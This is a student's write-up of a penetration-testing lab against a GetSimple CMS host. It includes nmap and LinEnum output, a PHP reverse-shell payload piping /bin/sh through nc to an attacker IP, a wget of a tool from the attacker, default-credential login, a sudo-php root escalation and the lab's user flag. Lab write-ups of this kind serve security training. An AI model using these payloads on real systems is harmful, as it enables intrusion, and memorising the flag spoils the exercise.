# GettingStarted — Scan & Exploitation Summary

**Context:** Knowledge-check lab. Tools used: Zenmap (Nmap), Rustscan, Feroxbuster, LinEnum. Target: `10.129.103.240` / `gettingstarted` web host.

---

## Quick findings
- Open ports discovered: **22/tcp (SSH)** and **80/tcp (HTTP - Apache 2.4.41 on Ubuntu)**.
- Web app identified: **GetSimple CMS v3.3.15** (needs update).
- SSH: OpenSSH 8.2p1 (did NOT accept website credentials).
- Writable web data directories identified (potentially useful): `/data/*`, `/backups/*`, `/data/uploads/`, etc.
- Admin panel discovered at `/admin/` (found with Feroxbuster) and default creds **admin:admin** worked for the CMS.
- PHP version: **7.4.3** (OK).
- `www-data` user on target can run `/usr/bin/php` as **NOPASSWD** via `sudo` (from `sudo -l`).
- User flag found under `/home/mrb3n`: `7002d65b149b0a4d19132a66feed21d8`.

---

## Nmap scan summary (key lines)
```
Host is up (0.048s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to GetSimple! - gettingstarted
OS: Linux 4.15 - 5.19 (likely Ubuntu 20.04)
Uptime guess: ~25 days
```

---

## CMS info (GetSimple)
- Version: **3.3.15** — reported "Upgrade Check Failed" (outdated).
- Some disabled PHP functions noted, but most common modules installed (cURL, GD, ZipArchive, SimpleXML) and file permissions mostly writable where needed for the CMS.

---

## Exploitation flow (what you did)
1. Found `/admin/` via directory enumeration; logged into GetSimple with `admin:admin`.
2. Could **not** use same password for SSH login.
3. Uploaded/inserted a PHP reverse-shell snippet into the site (payload example used):
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.170 9443 >/tmp/f"); ?>
```
4. Restarted/triggered the site and obtained an initial shell (as `www-data`).
5. Located user flag in `/home/mrb3n` and captured it.
6. Ran `sudo -l` as `www-data` and discovered:
```
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```
7. Hosted `LinEnum.sh` on attacker and ran it on target to enumerate; confirmed system is Ubuntu 20.04, kernel `5.4.0-65-generic`.
8. Privilege escalation — used `sudo php -r "system('/bin/sh');"` (or equivalent) to spawn a root shell (`whoami` -> `root`).

---

## Commands & snippets (copy/paste)
```bash
# Nmap quick scan
nmap -sS -sV -O -p- 10.129.103.240

# Feroxbuster (example)
feroxbuster -u http://10.129.103.240 -w /path/to/wordlist -x php,html

# Example PHP reverse shell payload (replace IP/PORT)
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f"); ?>

# Start listener (attacker)
nc -lvnp 9443

# After getting a shell as www-data, check sudo
sudo -l

# If NOPASSWD on /usr/bin/php:
sudo php -r "system('/bin/sh');"
# now root
whoami
```

---

## Observations & lessons
- Default/weak credentials on web apps are still common — always check `/admin` and try common creds.
- Writable web directories and outdated CMS versions offer multiple attack vectors (file upload, template editing, backups).
- `sudo` NOPASSWD entries for interpreters (`/usr/bin/php`, `/usr/bin/python`, etc.) are high-risk — they can be used to spawn arbitrary shells as root.
- LinEnum is a fast, effective enumeration tool for privilege escalation checks.
- Practice responsible disclosure and only run these techniques in authorized labs.

---

## Next steps / practice ideas
- Try other paths to initial code execution (file upload, plugin/theme editing, backup downloads).
- Explore alternative privilege escalation: misconfigured cron jobs, SUID files, credential files in config or backups.
- Harden the CMS: update GetSimple, restrict plugin uploads, secure file permissions, and remove default credentials.

---

*End of summary — save as `GettingStarted-scan-and-escalation.md` in your journal.*

---
<details>
doing the knowledge check

used zenmap, rustscan and found

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 12:04 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Initiating Ping Scan at 12:04
Scanning 10.129.103.240 [4 ports]
Completed Ping Scan at 12:04, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:04
Completed Parallel DNS resolution of 1 host. at 12:04, 0.07s elapsed
Initiating SYN Stealth Scan at 12:04
Scanning 10.129.103.240 [1000 ports]
Discovered open port 22/tcp on 10.129.103.240
Discovered open port 80/tcp on 10.129.103.240
Completed SYN Stealth Scan at 12:04, 0.93s elapsed (1000 total ports)
Initiating Service scan at 12:04
Scanning 2 services on 10.129.103.240
Completed Service scan at 12:04, 6.19s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.129.103.240
Initiating Traceroute at 12:04
Completed Traceroute at 12:04, 0.05s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 12:04
Completed Parallel DNS resolution of 2 hosts. at 12:04, 0.08s elapsed
NSE: Script scanning 10.129.103.240.
Initiating NSE at 12:04
Completed NSE at 12:04, 1.71s elapsed
Initiating NSE at 12:04
Completed NSE at 12:04, 0.22s elapsed
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Nmap scan report for 10.129.103.240
Host is up (0.048s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome to GetSimple! - gettingstarted
| http-robots.txt: 1 disallowed entry 
|_/admin/
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Uptime guess: 25.064 days (since Sun Oct  5 10:32:57 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   46.71 ms 10.10.14.1
2   46.79 ms 10.129.103.240

NSE: Script Post-scanning.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.71 seconds
           Raw packets sent: 1036 (46.370KB) | Rcvd: 1017 (41.398KB)


ports 22 and 80 open

used feroxbuster to find links

found /admin page

ssh     OpenSSH 8.2p1

http    Apache httpd 2.4.41

admin:admin worked to log in

website info:
GetSimple
GetSimple Version	3.3.15
Upgrade Check Failed !
Download
GSLOGINSALT	No
GSUSECUSTOMSALT	No
Server Setup
PHP Version	7.4.3 - OK
cURL Module	Installed - OK
GD Library	Installed - OK
ZipArchive	Installed - OK
SimpleXML Module	Installed - OK
chmod	chmod - OK
Apache Web Server	Apache/2.4.41 (Ubuntu) - OK
Apache Mod Rewrite	Installed - OK
PHP disable_functions pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,

For more information on the required modules, visit the requirements page.
Data File Integrity Check
/data/pages/index.xml	XML Valid - OK
/data/other/404.xml	XML Valid - OK
/data/other/authorization.xml	XML Valid - OK
/data/other/components.xml	XML Valid - OK
/data/other/pages.xml	XML Valid - OK
/data/other/plugins.xml	XML Valid - OK
/data/other/website.xml	XML Valid - OK
/backups/users/admin.xml	XML Valid - OK
Directory Permissions
File Name: /data/other/plugins.xml	0755 Writable - OK
/data/pages/	0755 Writable - OK
/data/other/	0755 Writable - OK
/data/other/logs/	0755 Writable - OK
/data/thumbs/	0755 Writable - OK
/data/uploads/	0755 Writable - OK
/data/users/	0755 Writable - OK
/data/cache/	0755 Writable - OK
/backups/zip/	0755 Writable - OK
/backups/pages/	0755 Writable - OK
/backups/other/	0755 Writable - OK
/backups/users/	0755 Writable - OK
.htaccess Existence
/data/	Good 'Deny' file - OK	
/data/uploads/	Good 'Allow' file - OK	
/data/users/	Good 'Deny' file - OK	
/data/cache/	Good 'Deny' file - OK	
/data/thumbs/	Good 'Allow' file - OK	
/data/pages/	Good 'Deny' file - OK	
/plugins/	Good 'Deny' file - OK	
/data/other/	Good 'Deny' file - OK	
/data/other/logs/	Good 'Deny' file - OK	
/theme/	No file - OK

uses GetSimple Version	3.3.15 - that needs an update

PHP Version	7.4.3 - OK

found some getsimple stuff

cant upload on site like we did before in class

ssh doesn't let us log in with the same password as website

so we have a way to update them and we put in teh code: <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.170 9443 >/tmp/f"); ?>

then we restart the site and get access




found user flag under mrb3n folder
7002d65b149b0a4d19132a66feed21d8

under sudo -l we find
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@gettingstarted:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php

wget http://10.10.15.170:8080/LinEnum.sh

we use chmod +x LinEnum.sh after we set up a server and run it

we get: #########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Thu Oct 30 17:19:04 UTC 2025                                                                                                                                                 
                                                                                                                                                                             

### SYSTEM ##############################################
[-] Kernel information:
Linux gettingstarted 5.4.0-65-generic #73-Ubuntu SMP Mon Jan 18 17:25:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 5.4.0-65-generic (buildd@lcy01-amd64-018) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #73-Ubuntu SMP Mon Jan 18 17:25:17 UTC 2021


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.2 LTS"
NAME="Ubuntu"
VERSION="20.04.2 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.2 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal


[-] Hostname:
gettingstarted


### USER/GROUP ##########################################
[-] Current user/group info:
uid=33(www-data) gid=33(www-data) groups=33(www-data)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
mrb3n            tty1                      Tue Mar 12 12:32:20 +0000 2024


[-] Who else is logged on:
 17:19:04 up  1:16,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=110(pollinate) gid=1(daemon) groups=1(daemon)
uid=111(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
uid=1000(mrb3n) gid=1000(mrb3n) groups=1000(mrb3n),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
uid=998(lxd) gid=100(users) groups=100(users)
uid=112(mysql) gid=117(mysql) groups=117(mysql)


[-] It looks like we have some admin users:
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=1000(mrb3n) gid=1000(mrb3n) groups=1000(mrb3n),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false


[-] Super user account(s):
root


[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php


[+] Possible sudo pwnage!
/usr/bin/php


[-] Accounts that have recently used sudo:
/home/mrb3n/.sudo_as_admin_successful


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root  root  4.0K Mar 12  2024 .
drwxr-xr-x 20 root  root  4.0K Mar 12  2024 ..
drwxr-xr-x  3 mrb3n mrb3n 4.0K Mar 12  2024 mrb3n


### ENVIRONMENTAL #######################################
[-] Environment information:
PWD=/var/www/html
APACHE_LOG_DIR=/var/log/apache2
LANG=C
INVOCATION_ID=2053d1ee8b4e450998cde1354228c1f6
APACHE_PID_FILE=/var/run/apache2/apache2.pid
APACHE_RUN_GROUP=www-data
APACHE_LOCK_DIR=/var/lock/apache2
SHLVL=1
LC_CTYPE=C.UTF-8
APACHE_RUN_DIR=/var/run/apache2
JOURNAL_STREAM=9:34747
APACHE_RUN_USER=www-data
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
_=/usr/bin/env


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
lrwxrwxrwx 1 root root     7 Feb  1  2021 /bin -> usr/bin
lrwxrwxrwx 1 root root     8 Feb  1  2021 /sbin -> usr/sbin
drwxr-xr-x 2 root root  4096 Mar 12  2024 /snap/bin
drwxr-xr-x 2 root root 36864 Mar 12  2024 /usr/bin
drwxr-xr-x 2 root root  4096 Mar 12  2024 /usr/local/bin
drwxr-xr-x 2 root root  4096 Mar 12  2024 /usr/local/sbin
drwxr-xr-x 2 root root 20480 Mar 12  2024 /usr/sbin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/usr/bin/screen


[-] Current umask value:
0022
u=rwx,g=rx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK  022


[-] Password and storage information:
PASS_MAX_DAYS 99999
PASS_MIN_DAYS 0
PASS_WARN_AGE 7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root 1042 Feb 13  2020 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Mar 12  2024 .
drwxr-xr-x 95 root root 4096 Mar 12  2024 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--  1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--  1 root root  712 Mar 27  2020 php
-rw-r--r--  1 root root  191 Feb  1  2021 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x  2 root root 4096 Mar 12  2024 .
drwxr-xr-x 95 root root 4096 Mar 12  2024 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root  539 Apr 13  2020 apache2
-rwxr-xr-x  1 root root  376 Dec  4  2019 apport
-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x  1 root root  214 Dec  7  2020 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Mar 12  2024 .
drwxr-xr-x 95 root root 4096 Mar 12  2024 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Mar 12  2024 .
drwxr-xr-x 95 root root 4096 Mar 12  2024 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Mar 12  2024 .
drwxr-xr-x 95 root root 4096 Mar 12  2024 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root  813 Feb 25  2020 man-db
-rwxr-xr-x  1 root root  211 Dec  7  2020 update-notifier-common


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 * * * * root    cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Systemd timers:
NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                     
Thu 2025-10-30 17:39:00 UTC 19min left    Thu 2025-10-30 17:09:00 UTC 10min ago            phpsessionclean.timer        phpsessionclean.service       
Thu 2025-10-30 20:55:57 UTC 3h 36min left Tue 2021-02-09 09:11:43 UTC 4 years 8 months ago apt-daily.timer              apt-daily.service             
Thu 2025-10-30 21:12:10 UTC 3h 53min left Thu 2025-10-30 16:19:17 UTC 59min ago            fwupd-refresh.timer          fwupd-refresh.service         
Fri 2025-10-31 00:00:00 UTC 6h left       Thu 2025-10-30 16:02:55 UTC 1h 16min ago         logrotate.timer              logrotate.service             
Fri 2025-10-31 00:00:00 UTC 6h left       Thu 2025-10-30 16:02:55 UTC 1h 16min ago         man-db.timer                 man-db.service                
Fri 2025-10-31 06:47:07 UTC 13h left      Thu 2025-10-30 16:22:17 UTC 56min ago            apt-daily-upgrade.timer      apt-daily-upgrade.service     
Fri 2025-10-31 10:09:55 UTC 16h left      Thu 2025-10-30 16:11:07 UTC 1h 7min ago          motd-news.timer              motd-news.service             
Fri 2025-10-31 16:17:48 UTC 22h left      Thu 2025-10-30 16:17:48 UTC 1h 1min ago          systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2025-11-02 03:10:03 UTC 2 days left   Thu 2025-10-30 16:03:39 UTC 1h 15min ago         e2scrub_all.timer            e2scrub_all.service           
Mon 2025-11-03 00:00:00 UTC 3 days left   Thu 2025-10-30 16:02:55 UTC 1h 16min ago         fstrim.timer                 fstrim.service                

10 timers listed.
Enable thorough tests to see inactive timers


### NETWORKING  ##########################################
[-] Network and IP info:
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.103.240  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:feb0:11e5  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb0:11e5  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b0:11:e5  txqueuelen 1000  (Ethernet)
        RX packets 89780  bytes 8643216 (8.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 86298  bytes 21448253 (21.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 6472  bytes 531623 (531.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6472  bytes 531623 (531.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


[-] ARP history:
? (10.129.0.1) at 00:50:56:b0:0f:91 [ether] on ens33


[-] Nameserver(s):
nameserver 127.0.0.53


[-] Nameserver(s):
Global
       LLMNR setting: no                  
MulticastDNS setting: no                  
  DNSOverTLS setting: no                  
      DNSSEC setting: no                  
    DNSSEC supported: no                  
  Current DNS Server: 1.1.1.1             
         DNS Servers: 1.1.1.1             
                      8.8.8.8             
          DNSSEC NTA: 10.in-addr.arpa     
                      16.172.in-addr.arpa 
                      168.192.in-addr.arpa
                      17.172.in-addr.arpa 
                      18.172.in-addr.arpa 
                      19.172.in-addr.arpa 
                      20.172.in-addr.arpa 
                      21.172.in-addr.arpa 
                      22.172.in-addr.arpa 
                      23.172.in-addr.arpa 
                      24.172.in-addr.arpa 
                      25.172.in-addr.arpa 
                      26.172.in-addr.arpa 
                      27.172.in-addr.arpa 
                      28.172.in-addr.arpa 
                      29.172.in-addr.arpa 
                      30.172.in-addr.arpa 
                      31.172.in-addr.arpa 
                      corp                
                      d.f.ip6.arpa        
                      home                
                      internal            
                      intranet            
                      lan                 
                      local               
                      private             
                      test                

Link 2 (ens33)
      Current Scopes: none
DefaultRoute setting: no  
       LLMNR setting: yes 
MulticastDNS setting: no  
  DNSOverTLS setting: no  
      DNSSEC setting: no  
    DNSSEC supported: no  


[-] Default route:
default         10.129.0.1      0.0.0.0         UG    0      0        0 ens33


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   


### SERVICES #############################################
[-] Running processes:
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  1.1 167456 11564 ?        Ss   16:02   0:01 /sbin/init maybe-ubiquity
root           2  0.0  0.0      0     0 ?        S    16:02   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   16:02   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   16:02   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   16:02   0:00 [kworker/0:0H-kblockd]
root           9  0.0  0.0      0     0 ?        I<   16:02   0:00 [mm_percpu_wq]
root          10  0.0  0.0      0     0 ?        S    16:02   0:00 [ksoftirqd/0]
root          11  0.0  0.0      0     0 ?        I    16:02   0:00 [rcu_sched]
root          12  0.0  0.0      0     0 ?        S    16:02   0:00 [migration/0]
root          13  0.0  0.0      0     0 ?        S    16:02   0:00 [idle_inject/0]
root          14  0.0  0.0      0     0 ?        S    16:02   0:00 [cpuhp/0]
root          15  0.0  0.0      0     0 ?        S    16:02   0:00 [cpuhp/1]
root          16  0.0  0.0      0     0 ?        S    16:02   0:00 [idle_inject/1]
root          17  0.0  0.0      0     0 ?        S    16:02   0:00 [migration/1]
root          18  0.0  0.0      0     0 ?        S    16:02   0:00 [ksoftirqd/1]
root          20  0.0  0.0      0     0 ?        I<   16:02   0:00 [kworker/1:0H-kblockd]
root          21  0.0  0.0      0     0 ?        S    16:02   0:00 [kdevtmpfs]
root          22  0.0  0.0      0     0 ?        I<   16:02   0:00 [netns]
root          23  0.0  0.0      0     0 ?        S    16:02   0:00 [rcu_tasks_kthre]
root          24  0.0  0.0      0     0 ?        S    16:02   0:00 [kauditd]
root          26  0.0  0.0      0     0 ?        S    16:02   0:00 [khungtaskd]
root          27  0.0  0.0      0     0 ?        S    16:02   0:00 [oom_reaper]
root          28  0.0  0.0      0     0 ?        I<   16:02   0:00 [writeback]
root          29  0.0  0.0      0     0 ?        S    16:02   0:00 [kcompactd0]
root          30  0.0  0.0      0     0 ?        SN   16:02   0:00 [ksmd]
root          31  0.0  0.0      0     0 ?        SN   16:02   0:00 [khugepaged]
root          78  0.0  0.0      0     0 ?        I<   16:02   0:00 [kintegrityd]
root          79  0.0  0.0      0     0 ?        I<   16:02   0:00 [kblockd]
root          80  0.0  0.0      0     0 ?        I<   16:02   0:00 [blkcg_punt_bio]
root          82  0.0  0.0      0     0 ?        I<   16:02   0:00 [tpm_dev_wq]
root          83  0.0  0.0      0     0 ?        I<   16:02   0:00 [ata_sff]
root          84  0.0  0.0      0     0 ?        I<   16:02   0:00 [md]
root          85  0.0  0.0      0     0 ?        I<   16:02   0:00 [edac-poller]
root          86  0.0  0.0      0     0 ?        I<   16:02   0:00 [devfreq_wq]
